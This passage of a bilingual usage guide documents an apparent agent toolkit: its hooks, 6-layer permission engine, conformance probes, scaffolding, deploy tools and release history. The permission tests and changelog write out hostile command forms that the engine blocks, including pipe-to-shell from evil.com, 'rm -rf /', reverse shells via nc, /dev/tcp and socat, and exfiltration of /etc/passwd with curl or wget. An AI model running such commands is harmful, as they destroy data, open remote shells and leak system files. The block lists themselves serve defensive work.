`VIBECODE_AUTOCOMMIT=1`.  Logic:

```
1. Bắt sự kiện post_tool_use → đọc payload
2. Nếu payload có file diff:
   a. Chạy sensitive-file guard (block .env, secrets, key, etc.)
   b. Nếu OK → git add + git commit (atomic, 1 commit per tool call)
3. Output JSON envelope { decision: allow, auto_commit: { ... } }
```

Disable mặc định.  Bật:
```bash
export VIBECODE_AUTOCOMMIT=1
```

Tắt khi đã bật:
```bash
unset VIBECODE_AUTOCOMMIT     # hoặc =0
export VIBECODE_NO_AUTOCOMMIT=1
```

### 22.4 Custom hook

Để thêm hook mới, tạo file `.py` trong `.claw/hooks/<event>.py`,
expose function `def main(payload: dict) -> dict:`.  Runtime sẽ gọi
file đầu tiên tìm thấy theo glob ordering.

```python
# .claw/hooks/pre_tool_use_my_extra.py
def main(payload: dict) -> dict:
    if "evil" in str(payload.get("command", "")):
        return {"decision": "deny", "reason": "blocked by my_extra"}
    return {"decision": "allow"}
```

Test:
```bash
echo '{"command":"echo evil"}' | python .claw/hooks/pre_tool_use_my_extra.py
```

### 22.5 Probe binding

- Probe `22_26_hook_events` — verify 26 minimum event
- Probe `30_structured_notifications` — verify `notification` payload
  schema
- Probe `82_session_start_learnings_inject` — verify session_start
  inject 7-day learnings

---

## 23. Conformance probe catalog — 87 probe

> Dùng `vibe audit` để chạy tất cả; `vibe audit --probe <name>` để
> chạy 1 probe.  Threshold release-gate là **1.0** (100 % parity).

### 23.1 Cluster theo domain (87 probe)

| Cluster | Range | Mô tả |
|---|---|---|
| **Runtime core** | 01–18 | async loop, follow-up, recovery, concurrency, streaming, modifier chain, ACL, fork, defense, permission, conditional skill, shell-in-prompt, dynamic discovery, plugin, sandbox, install, native replacement, terminal-as-browser |
| **Background tasks + MCP** | 19–24, 27–30, 39 | 7 task kind, MCP adapter, cost ledger, hook events, follow-up reexecute, denial concurrency, dream 4-phase, MCP stdio handshake, structured notifications, MCP full handshake |
| **Memory + approval** | 25, 26 | 3-tier memory, approval contract |
| **Methodology** | 31–38 | RRI, RRI-T, RRI-UX, RRI-UI, vibecode-master workflow, methodology slash commands, methodology runners, config persistence |
| **Refine + Verify + Anti-patterns** | 40–42 | refine boundary, verify req coverage, 12 SaaS anti-patterns |
| **Scaffold + Module** | 43–45 | portfolio/saas scaffolds, enterprise module, docs scaffold |
| **Style + Stack** | 46–50 | style tokens, RRI question bank, copy patterns, stack rec, docs intent routing |
| **Command wiring** | 51–53 | command-context wiring, command-agent binding, skill paths |
| **Browser daemon** | 54–62 | atomic state, idle timeout, port selection, cookie path, permission routing, envelope wrap, hidden strip, BiDi sanitisation, URL blocklist |
| **VCK extension** | 63–67 | `/vck-*` command present, frontmatter attribution, agents registered, command-agent binding, license attribution |
| **Classifier ensemble** | 68–73 | contract, regex bank, prompt-injection block, secret-leak block, optional layers, eval/select diff-based |
| **Team / Learn** | 74–82 | learnings store, team mode, GitHub Actions CI, CONTRIBUTING + USAGE_GUIDE, /vck-ship team mode, eval/select wired, session ledger, classifier auto-on, session_start learnings inject, scaffold seed `.vibecode/` |
| **Pipeline router (v0.16+)** | 84, 86, 87 | `/vck-pipeline` command, `/vck-review` classifier wired, `/vck-cso` classifier wired |
| **Integrity** | 85 | no orphan module (38 wired + 5 allowlisted) |

### 23.2 Spotlight: probe `85_no_orphan_module`

Đảm bảo mỗi module Python trong `scripts/vibecodekit/` đều có call
site thật (production code) hoặc nằm trong allowlist (`_audit_allowlist.json`).

Hiện tại 45 module = **38 wired** + **5 allowlisted** + **2 internal**
(`__init__`, `conformance_audit`).  Allowlist hiện chứa:

- `vn_faker` — Vietnamese fake-data generator (dùng qua public API)
- `vn_error_translator` — VN error translator (dùng qua public API)
- `quality_gate` — public Python API for callers
- `tool_use_parser` — public parsing helper
- `worktree_executor` — public worktree API

Allowlist được pin trong test `tests/test_audit_probe_85_no_orphan.py`.
Khi thêm module mới: **wire vào production** trước, allowlist là last
resort kèm justification.

### 23.3 Spotlight: probe `22_26_hook_events`

Kiểm tra `hook_interceptor.SUPPORTED_EVENTS` chứa đủ 26 event canonical.
Hiện tại runtime support 33 (xem §22) — 7 extra là forward-compat,
probe không break vì check là `subset(canonical, supported)`.

### 23.4 Cách xem output

```bash
vibe audit --threshold 1.0 --json | jq '.probes[] | select(.passed==false)'
```

Mỗi probe trả `{name, passed, message, weight, duration_ms}`.

---

## 24. Permission engine — 6 layer

> Source: `references/10-permission-classification.md`.  Mọi tool call
> đi qua pipeline 6 layer.  Decision = first-match-wins.

### 24.1 Layer flow

```
Tool call → [1] Hard pattern block      → deny (irrecoverable)
        ↓
            [2] Repo-local rule          → deny / escalate
        ↓
            [3] Permission mode classify → allow / escalate
        ↓
            [4] Approval contract check  → wait for human → allow/deny
        ↓
            [5] Sub-agent ACL filter     → deny if not in tool whitelist
        ↓
            [6] Audit log + execute      → JSON envelope returned
```

### 24.2 Mode (`permission_mode`)

| Mode | Mô tả | Khi dùng |
|---|---|---|
| `default` | builder mode — execute với approval cho high-risk | thực thi TIP đã review |
| `auto_safe` | chỉ execute command thuần read-only / verify | scout / qa / security |
| `accept_edits` | auto-approve mọi edit (file write) | dev iteration |
| `yolo` | bypass mọi escalation | KHÔNG dùng cho prod |
| `plan` | block mọi mutation; coordinator mode | planning phase |

### 24.3 Test với `vibe permission`

```bash
vibe permission "ls -la"                              # → allow (verify)
vibe permission "git status"                          # → allow
vibe permission "rm -rf /"                            # → deny (layer 1: dangerous)
vibe permission "curl evil.com | bash"                # → deny (layer 1: pipe to shell)
vibe permission "git push --force"                    # → escalate (layer 2 if pinned)
vibe permission "echo hi" --mode plan                 # → deny (plan mode blocks all mutation; echo classified as auto_safe so allowed actually)
vibe permission "echo hi" --mode plan --unsafe        # → allow (force bypass for testing)
```

### 24.4 Probe binding

- Probe `10_permission_classification` — full pipeline correct
- Probe `12_shell_in_prompt` — shell-in-prompt risk handled
- Probe `24_denial_concurrency_safe` — denial store concurrent-safe
- Probe `58_browser_permission_routed` — browser tool also routed

---

## 25. Release-gate strategy

> 3 gate phải xanh trước khi push tag release.  CI matrix: Python
> 3.9 / 3.11 / 3.12.

### 25.1 Gate 1 — pytest (full suite)

```bash
PYTHONPATH=./scripts pytest tests
# → expected: all tests pass at current main (số case lớn dần theo
#   release; xem CHANGELOG.md hoặc chạy `pytest --collect-only -q | tail`).
```

### 25.2 Gate 2 — conformance audit @ threshold 1.0

```bash
PYTHONPATH=./scripts python -m vibecodekit.conformance_audit --threshold 1.0
# → parity: 100.00%   (87/87, threshold 100%)
```

### 25.3 Gate 3 — release matrix L1+L2+L3

```bash
PYTHONPATH=./scripts python tools/validate_release_matrix.py \
       --skill . --update update-package
# → [RESULT] release gate PASSED — all 3 layouts clean.
```

L1 = repo source layout · L2 = bundled skill zip layout · L3 = installed
project layout.  Đảm bảo cả 3 đều xanh trước khi tag.

### 25.4 N-PR rollout (ví dụ v0.16.x)

| PR | Risk | Scope |
|---|---|---|
| #13 v0.15.5 | green | hotfix runtime version constants |
| #14 v0.16.0a0 | yellow | wire auto_commit_hook + multi-token routers |
| #15 v0.16.0 | green | doc + test cleanup, alpha → final |
| #16 v0.16.1 | green | doc-coherence + recheck cleanup (5 finding) |

Nguyên tắc: chia rủi ro theo PR; mỗi PR phải có 3 gate xanh; gates
match xuyên CI (3.9 / 3.11 / 3.12).
## 16. Release history

### v0.16.1 — doc coherence + recheck cleanup (PR #16)

Khép 5 P3 finding từ v0.16.0 auto-recheck:

- **A** ACL doc table 5→7 role (CLAUDE.md + 3 doc mirror)
- **B** Version anchor v0.15.4→v0.16.1 + 500→762 across 6 doc
- **C** Router phrase bank thêm `"build the whole thing"` + `"set everything up"` vào `intent_router.VCK_PIPELINE` + 4 test parametrize
- **D** Pyflakes dead-code: 3 dead import + 1 unused var + 4 placeholder-less f-string
- **E** `vibe doctor` thêm `_is_skill_repo()` fallback + `skill_repo` flag + 2 test

Verification: pytest 762 passed · audit 87/87 @ 100 % · release-matrix L1+L2+L3 PASS · CI 3/3 green.

### v0.16.0 — final cleanup of v0.15.4 audit (PR #15)

Close v0.15.4 audit P3 #8/#10/#12 (doc + lint + test cleanup); promote v0.16.0a0 → v0.16.0 final.  pytest 756 passed.

### v0.16.0a0 — α: wire auto_commit_hook + multi-token routers (PR #14)

- Wire `auto_commit_hook` từ `post_tool_use.py` (opt-in qua `VIBECODE_AUTOCOMMIT=1`)
- Allowlist 3 soft-orphan public API (`quality_gate`, `tool_use_parser`, `worktree_executor`) trong `_audit_allowlist.json`
- Multi-token phrase boost cho `VCK_REVIEW` + `VCK_CSO` bank
- Close P2 #4/#5/#6/#7 + P3 #9 từ v0.15.4 audit

### v0.15.5 — green hotfix (PR #13)

Fix 3 stale `0.11.4.1` runtime version constants (`__init__.py:_FALLBACK_VERSION`, `mcp_client.py:client_version`, `mcp_servers/selfcheck.py:serverInfo.version`) + egg-info gitignore guard.  Bump `0.15.4 → 0.15.5` trên 8 surface.  Close P1 #1/#2/#3 + P3 #11.

### v0.15.4 — doc-sync hotfix

Doc anchors snap to v0.15.4; tests count = 500.

---

### 16.7 v0.11.x BIG-UPDATE history — 6 tính năng mới

Bản v0.11.0 BIG-UPDATE (historical) tích hợp 6 strengths của
[`taw-kit`](https://github.com/VagabondKingsman/taw-kit) thành layer
mới trên VibecodeKit, **tất cả** 42 slash command + 87/87
conformance audit.  Phân theo 3 phase ship: **α** (v0.10.7), **β**
(v0.10.8), **final** (v0.11.0).

| Phase | Feature | Module Python | Slash command | Tests |
|---|---|---|---|---:|
| α | F3 auto-commit + sensitive-file guard | `auto_commit_hook.py` | (hook, không có cmd) | 37 |
| α | F5a VN error translator | `vn_error_translator.py` | (Python API) | 13 |
| α | F5b VN faker | `vn_faker.py` | (Python API) | 14 |
| β | F4 single-prompt router | `intent_router.py` | `/vibe` | 38 |
| β | F6 CLAUDE.md auto-maintain | `memory_writeback.py` | `/vibe-memory` (mở rộng) | 17 |
| **final** | **F1 scaffold engine** | `scaffold_engine.py` | `/vibe-scaffold` | 19 |
| **final** | **F2 deploy orchestrator** | `deploy_orchestrator.py` | `/vibe-ship` | 28 |
| | | | **Tổng v0.11.0 BIG-UPDATE** | **166** |

### 16.1 `/vibe` — single-prompt router (F4)

**TL;DR.** Gõ 1 câu tiếng Việt hoặc Anh, kit tự chọn 1 hoặc nhiều
slash command tương ứng.  Giữ 21 lệnh `vibe-*` cũ làm "advanced API"
cho power user — `/vibe` là wrapper trên top.

**Khi nào dùng**
- Không nhớ lệnh nào → cứ gõ `/vibe <ý định>`.
- Multi-step pipeline ("làm shop online" → SCAN → VISION → RRI →
  BUILD → VERIFY) — router tự expand.

**Slash command (Claude Code / Claw Code)**

```
/vibe làm cho tôi shop online bán cà phê
/vibe scan repo này
/vibe loi roi fix giup        # diacritics-stripped VN cũng nhận
/vibe deploy lên Vercel
```

**CLI tương đương**

```bash
# Classify ý định (in JSON)
python -m vibecodekit.cli intent classify "làm shop online"

# Route ra danh sách slash command
python -m vibecodekit.cli intent route "làm shop online"
# → {"commands": ["/vibe-scan", "/vibe-vision", "/vibe-rri", "/vibe-blueprint", "/vibe-verify"], ...}
```

**Python API**

```python
from vibecodekit.intent_router import IntentRouter
r = IntentRouter()
match = r.classify("làm shop online bán cà phê")
print(match.intents)        # ('SCAN', 'VISION', 'RRI', 'BUILD', 'VERIFY')
print(r.route(match))       # ['/vibe-scan', '/vibe-vision', '/vibe-rri', '/vibe-blueprint', '/vibe-verify']
```

14 tier-1 intents: `SCAN, VISION, RRI, RRI-T, RRI-UX, RRI-UI, BUILD,
VERIFY, SHIP, MAINTAIN, ADVISOR, MEMORY, DOCTOR, DASHBOARD`.  Pipeline
triggers: `"shop online"`, `"landing page"`, `"ra mắt sản phẩm"`,
`"launch product"`.

### 16.2 `/vibe-scaffold` — scaffold engine (F1)

**TL;DR.** Tạo ngay project chạy được từ 10 preset × 3 stack
(Next.js / FastAPI / Expo).  Mỗi preset khai báo `success_criteria`
nên engine tự verify được output sau khi ghi.

**10 preset bundled**

| Preset | Stack | Build gì |
|---|---|---|
| `landing-page` | nextjs | Hero + features + email capture |
| `shop-online`  | nextjs | Catalog + giỏ hàng skeleton |
| `crm`          | nextjs **\|** fastapi | Contacts CRUD (web hoặc API) |
| `blog`         | nextjs | MDX blog + listing |
| `dashboard`    | nextjs | KPI cards + recharts |
| `api-todo`     | fastapi | REST todo + pytest |
| `mobile-app`   | expo | Expo React Native starter |

**Slash command**

```
/vibe-scaffold       # giải thích cách dùng + list preset
/vibe làm landing page  # router auto-call /vibe-scaffold
```

**CLI**

```bash
# 1. Liệt kê preset có sẵn
python -m vibecodekit.cli scaffold list

# 2. Preview file tree (dry-run, không ghi đĩa)
python -m vibecodekit.cli scaffold preview landing-page --stack nextjs

# 3. Ghi project ra ./my-site
python -m vibecodekit.cli scaffold apply landing-page ./my-site --stack nextjs

# 4. Multi-stack monorepo
python -m vibecodekit.cli scaffold apply crm ./crm/web --stack nextjs
python -m vibecodekit.cli scaffold apply crm ./crm/api --stack fastapi
```

**Python API**

```python
from vibecodekit.scaffold_engine import ScaffoldEngine
e = ScaffoldEngine()
plan = e.preview("crm", stack="fastapi", target_dir="./crm-api")
result = e.apply("crm", "./crm-api", stack="fastapi")
issues = e.verify(result)
assert not issues, issues   # success_criteria probe
```

### 16.3 `/vibe-ship` — deploy orchestrator (F2)

**TL;DR.** SHIP layer hoàn chỉnh.  Auto-detect target từ filesystem,
chạy preflight, deploy, ghi lại history để rollback.

**7 driver**

| Target | Detect via | Lệnh |
|---|---|---|
| Vercel     | `vercel.json`, `next.config.*` | `npx vercel --prod` |
| Docker     | `Dockerfile`, `compose.yaml`   | `docker build -t …` (auto-gen Dockerfile nếu thiếu) |
| VPS        | `.vps.env`                     | `rsync` + `ssh systemctl restart` |
| Cloudflare | `wrangler.toml`                | `wrangler pages deploy` |
| Railway    | `railway.json`                 | `railway up --detach` |
| Fly        | `fly.toml`                     | `flyctl deploy` |
| Render     | `render.yaml`                  | `git push render main` (Render auto-deploy) |

**Slash command**

```
/vibe-ship           # auto-detect + deploy
/vibe-ship --target vercel --prod
/vibe deploy lên Cloudflare    # router → /vibe-ship
```

**CLI**

```bash
# Auto-detect (đọc filesystem, chọn target)
python -m vibecodekit.cli ship

# Force target cụ thể
python -m vibecodekit.cli ship --target vercel --prod

# Dry-run (validate preflight, log lệnh nhưng không thực sự gọi shell)
python -m vibecodekit.cli ship --target docker --dry-run

# Xem history + rollback
python -m vibecodekit.cli ship history
python -m vibecodekit.cli ship rollback <snapshot_id>
```

**Python API**

```python
from vibecodekit.deploy_orchestrator import DeployOrchestrator, DryRunner

# Production
o = DeployOrchestrator(repo_dir=".")
target = o.select_target()                   # auto-detect
issues = target.preflight(o.repo)            # check missing creds
result = o.run(target, opts={"prod": True})
print(result.url, result.snapshot_id)

# Test / CI
o_dry = DeployOrchestrator(".", runner=DryRunner())
o_dry.run("docker", opts={"tag": "demo:1"})
```

**State files** (per repo): `.vibecode/deploy-target.txt`,
`deploy-url.txt`, `deploy-history.jsonl` (append-only audit log).

### 16.4 CLAUDE.md auto-maintain (F6)

**TL;DR.** Tự động sync `CLAUDE.md` với stack / scripts / conventions
/ gotchas / test-strategy của repo.  Save token mỗi session vì Claude
đọc CLAUDE.md ngay từ đầu.

**Marker convention**

```html
<!-- vibecode:auto:stack:begin -->
... nội dung được engine maintain ...
<!-- vibecode:auto:stack:end -->
```

User edit **bên ngoài marker** = preserved byte-for-byte.  User edit
**bên trong marker** = sẽ bị overwrite bởi `update()`.

**5 section auto-maintained**

| Section | Detect gì |
|---|---|
| `stack`         | Next.js / React / Expo / Python / FastAPI / Django / Go / Rust + version |
| `scripts`       | npm scripts (`package.json`) + Makefile targets |
| `conventions`   | File org pattern (e.g. controllers ở `src/api/`) |
| `gotchas`       | Errors hit + đã resolve trong `.vibecode/run-history` |
| `test-strategy` | pytest / vitest / jest + cách chạy |

**Slash command**

```
/vibe-memory writeback init     # Tạo CLAUDE.md mới với 5 section
/vibe-memory writeback update   # Refresh các section đã drift
/vibe-memory writeback check    # Báo cáo drift (không ghi)
/vibe-memory writeback nest src/api  # Tạo nested CLAUDE.md
```

**CLI**

```bash
python -m vibecodekit.cli memory --root . writeback init
python -m vibecodekit.cli memory --root . writeback update
python -m vibecodekit.cli memory --root . writeback check
python -m vibecodekit.cli memory --root . writeback nest src/api
```

**Python API**

```python
from vibecodekit.memory_writeback import MemoryWriteback
m = MemoryWriteback(repo_dir=".")
m.init()                       # CLAUDE.md mới
m.update()                     # refresh các section
report = m.check()             # DriftReport(in_sync, drifted, missing, extra)
m.nest("src/api")              # nested CLAUDE.md cho module
```

### 16.5 Auto-commit hook + sensitive-file guard (F3)

**TL;DR.** Hook chạy sau mỗi `Write|Edit` của Claude Code:
- Block ghi file nhạy cảm (`.env`, `.pem`, `id_rsa`, AKIA*, ghp_*).
- Auto-commit progress (debounce 60 s) với tag `[vibecode-auto]`.

**Patterns block**

```
\.env(\..*)?$         → kể cả .env.production, .env.local
\.key$  \.pem$  \.p12$
^id_(rsa|ed25519|ecdsa)$
\.aws/credentials  \.gcp/.*\.json
credentials  service[-_]account
# token markers trong content:
AKIA[0-9A-Z]{16}    sk-[A-Za-z0-9]{20,}    ghp_…    AIza…
```

**Whitelist** (cho phép): `.env.example`, `.env.sample`,
`.env.template`.

**Tắt auto-commit**: `export VIBECODE_NO_AUTOCOMMIT=1`.

**Python API**

```python
from pathlib import Path
from vibecodekit.auto_commit_hook import AutoCommitHook, SensitiveFileGuard

# Pre-write guard (gọi từ bất kỳ hook nào write file).
# Raises PermissionError nếu path / content match patterns nhạy cảm.
guard = SensitiveFileGuard()
try:
    guard.check("config/.env", content="DB_PASS=…")
except PermissionError as exc:
    print(exc)  # "sensitive file refused by SensitiveFileGuard: config/.env"

# Post-write commit (debounced).  V0.16.0-α: wired into
# update-package/.claw/hooks/post_tool_use.py — set
# VIBECODE_AUTOCOMMIT=1 to enable it from the hook context.
hook = AutoCommitHook(debounce_s=60)
decision = hook.commit(Path("."), message="after Edit")
print(decision.commit, decision.reason, decision.files)
```

**Filter commits dễ**

```bash
git log --grep '\[vibecode-auto\]' --oneline
```

### 16.6 VN error translator + VN faker (F5)

**TL;DR.** Hai tool VN-native cho dev người Việt:
- **VnErrorTranslator** — feed stderr / traceback → ra giải thích VN
  + suggested fix copy-paste được.
- **VnFaker** — sinh dữ liệu mẫu hợp luật VN (tên, số ĐT post-2018,
  CCCD đúng prefix tỉnh, VND format `1.500.000đ`).

**VN error translator — Python API**

```python
from vibecodekit.vn_error_translator import VnErrorTranslator
t = VnErrorTranslator()

err = """npm ERR! ERESOLVE could not resolve
npm ERR! While resolving: my-app@1.0.0
npm ERR! Found: react@17.0.2"""

result = t.translate(err)
print(result.summary_vn)         # "Xung đột peer-dependencies"
print(result.fix_suggestion_vn)  # "Chạy npm install --legacy-peer-deps …"
print(result.confidence)         # 0.0–1.0
```

35+ pattern bundled cho Python / npm / TypeScript / Next.js / Supabase
/ Docker / git / curl / network errors.

**VN faker — Python API**

```python
from vibecodekit.vn_faker import VnFaker
f = VnFaker(seed=2026)            # deterministic

f.name()             # "Phạm Tuấn Tuấn"
f.phone()            # "0383.998698"     (chỉ prefix sau migration 2018)
f.cccd()             # "077309730911"    (prefix 077 = Quảng Ngãi)
f.address()          # "Phường 5, Quận 3, TP.HCM"
f.company()          # "Công ty TNHH ABC"
f.bank_account()     # "MB-9876543210"
f.vnd_amount(1_000_000, 100_000_000)  # "56.700.000đ"
f.email()            # "tuan.pham@example.vn"  (strip diacritics)
```

**Use case** — seed `users.json` cho demo:

```python
import json
from vibecodekit.vn_faker import VnFaker

f = VnFaker(seed=42)
users = [
    {"name": f.name(), "phone": f.phone(),
     "cccd": f.cccd(), "address": f.address()}
    for _ in range(10)
]
json.dump(users, open("users.json", "w"), ensure_ascii=False, indent=2)
```

---

## Phụ lục A — Runtime ports

- Runtime probes: 39 (100 % parity với "Giải phẫu Agentic OS" PDF)
- Tests: 359 (`pytest tests/ -q`) — v0.10.6 thêm 17 bypass tests (rm -r -f, reverse shell, data exfil)
- Hook events: 33 lifecycle points (see `hook_interceptor.SUPPORTED_EVENTS`)
- Permission patterns: 40+
- Task kinds: 7 (local_agent, local_workflow, monitor_mcp, dream,
  remote_agent, in_process_teammate, supervisor)
- Agent roles: 5 (coordinator, scout, builder, qa, security)
- RRI modes: 3 (CHALLENGE, GUIDED, EXPLORE)
- RRI personas: 5 (Architect, Lead, QA, Security, Compliance)
- RRI-T dims: 7 (D1-D7) × 8 stress axes
- RRI-UX dims: 7 (U1-U7) × 8 Flow Physics axes
- VN checklist: 12 points

## Phụ lục B — Tài liệu tham chiếu

| Ref | Nội dung |
|-----|----------|
| 00 | Overview |
| 01-17 | Claude Code 18 runtime patterns |
| 19-24 | v0.8 subsystems (task runtime, MCP, ledger, hooks, recovery, denial store) |
| 25-28 | v0.9 subsystems (memory, approval, 7 task kinds, dream) |
| 29 | RRI — Reverse Requirements Interview |
| 30 | VIBECODE-MASTER |
| 31 | RRI-T testing |
| 32 | RRI-UX critique + 12-point VN checklist |
| 33 | RRI-UI design pipeline |

## Phụ lục C — Semver phiên bản

| Version | Ngày | Highlight |
|---------|------|-----------|
| 0.11.2 | 2026-04-28 | **BIG-UPDATE final**: F1 scaffold engine (7 preset × 3 stacks: Next.js/FastAPI/Expo, 43 template files, 19 tests) + F2 deploy orchestrator (7 target: Vercel/Docker/VPS/Cloudflare/Railway/Fly/Render, 28 tests). Slash cmd `/vibe-scaffold` + `/vibe-ship`. Tests 479 → **526**, audit 39/39, validate_release clean. |
| 0.10.8 | 2026-04-27 | **BIG-UPDATE Phase β**: F4 single-prompt `/vibe` router (14 tier-1 intents, VN+EN, pipeline expansion, 38 tests) + F6 CLAUDE.md auto-maintain (5 sections, marker-strict, 17 tests). Tests 424 → 479. |
| 0.10.7 | 2026-04-26 | **BIG-UPDATE Phase α**: F3 auto-commit hook + sensitive-file pre-write guard (37 tests, 22 patterns + token markers) + F5a VN error translator (35+ patterns, 13 tests) + F5b VN faker (CCCD prefix table, post-2018 phones, deterministic seed, 14 tests). Tests 360 → 424. |
| 0.10.6 | 2026-04-25 | Post-v0.10.5 audit cleanup: README body `(0.10.3)` → `(0.10.6)` (sed miss in v0.10.5), test-count clarified (360 full suite vs 17 bundled subset), `validate_release.py` now also scans zip contents directly (not just source tree) to prevent future zip-hygiene regressions, new `test_shipped_zips_are_clean`. |
| 0.10.5 | 2026-04-25 | Audit follow-up after v0.10.4: 3 more bypass classes (rm separate flags `-r -f`, reverse shell `nc -e`/`bash >& /dev/tcp`/`socat EXEC:`, data exfil `curl -d @/etc/passwd`/`wget --post-file=`/`scp` sensitive). `tools/validate_release.py` bundled in zip. Tightened junk-exclude list (.pytest_cache, denials.*). |
| 0.10.4 | 2026-04-25 | Security-hardening: 11-class permission bypass vectors closed (`$(rm -rf)`, `bash -c`, `python -c`, `IFS=`, `source /tmp/`, block-device redirect, `/proc/sys` write, `xargs rm`, `LD_PRELOAD`, `exec rm`, Unicode minus/em-dash/FW-hyphen normalisation). All `subprocess.run` calls now have wall-clock timeout. USAGE_GUIDE mermaid flowchart + QUICKSTART pointer. |
| 0.10.3 | 2026-04-25 | UX + Windows + 2 self-audit: cross-platform file lock (fcntl/msvcrt), QUICKSTART + integration tests + VERSION + USAGE_GUIDE bundled in zips, `StdioSession.request()/notify()` public, `vibe dashboard --html` static snapshot, `tools/validate_release.py` pre-packaging gate, sbert silent-downgrade fixed (now raises ValueError) |
| 0.10.2 | 2026-04-25 | Fix MCP deadlock (readline + stderr fill); evaluate_rri_t/ux gate missing-dim |
| 0.10.1 | 2026-04-25 | MCP full handshake, methodology runners, VN checklist, config persist |
| 0.10.0 | 2026-04-25 | RRI + RRI-T + RRI-UX + RRI-UI + VIBECODE-MASTER methodology layer |
| 0.9.0  | 2026-04-24 | 100 % Agentic OS parity (30 probes) |
| 0.8.0  | 2026-04-23 | "Full Agentic OS" — 6 new subsystems |
| 0.7.1  | 2026-04-22 | 18 Claude Code patterns, security hardening |
| 0.7.0  | 2026-04-22 | Full rewrite, behaviour-based audit |
| 0.6.0  | 2026-04-21 | Query-loop engine prototype |

---

**Ready to ship.** Bắt đầu từ `/vibe-scan` trong môi trường Claude Code / Claw
Code là đủ — kit sẽ dẫn bạn qua 8 bước.
